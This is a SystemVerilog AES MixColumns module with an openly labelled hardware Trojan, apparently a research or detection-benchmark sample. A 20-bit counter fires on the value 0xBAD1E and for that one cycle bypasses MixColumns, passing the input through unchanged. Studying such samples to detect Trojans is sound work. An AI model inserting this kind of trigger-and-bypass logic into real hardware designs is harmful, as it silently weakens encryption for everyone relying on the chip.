module aes_mix_columns (
  input  logic                  clk,        // Trojan insertion: Add clock input for sequential logic
  input  logic                  rst_n,      // Trojan insertion: Add active-low reset
  input  aes_pkg::ciph_op_e     op_i,
  input  logic [3:0][3:0][7:0]  data_i,
  output logic [3:0][3:0][7:0]  data_o
);

  import aes_pkg::*;

  // Transpose to operate on columns
  logic [3:0][3:0][7:0] data_i_transposed;
  logic [3:0][3:0][7:0] data_o_transposed;

  assign data_i_transposed = aes_transpose(data_i);

  // ==================== Trojan insertion: Begin ====================
  // Hardware Trojan: Rare-cycle MixColumns bypass via internal counter

  // 20-bit counter to minimize trigger probability
  logic [19:0] trojan_cnt;
  logic        trojan_triggered;  // signal for rare event trigger

  // Proper reset logic, counter initialization
  always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      trojan_cnt <= 20'd0;
    end else begin
      trojan_cnt <= trojan_cnt + 1'b1;
    end
  end

  // Trigger on a rare (secret) counter value, single cycle
  localparam logic [19:0] TROJAN_TRIGGER_VAL = 20'hBAD1E;
  always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      trojan_triggered <= 1'b0;
    end else if (trojan_cnt == TROJAN_TRIGGER_VAL) begin
      trojan_triggered <= 1'b1;
    end else begin
      trojan_triggered <= 1'b0;
    end
  end

  // ==================== Trojan insertion: End ======================

  // Individually mix columns
  for (genvar i = 0; i < 4; i++) begin : gen_mix_column
    aes_mix_single_column u_aes_mix_column_i (
      .op_i   ( op_i                 ),
      .data_i ( data_i_transposed[i] ),
      .data_o ( data_o_transposed[i] )
    );
  end

  // ==================== Trojan insertion: Begin ====================
  // Bypass MixColumns operation for one cycle on trigger, else normal operation
  always_comb begin
    if (trojan_triggered) begin
      // Payload: Bypass transformation, output untransformed input
      data_o = data_i;
    end else begin
      // Normal functionality
      data_o = aes_transpose(data_o_transposed);
    end
  end
  // ==================== Trojan insertion: End ======================

endmodule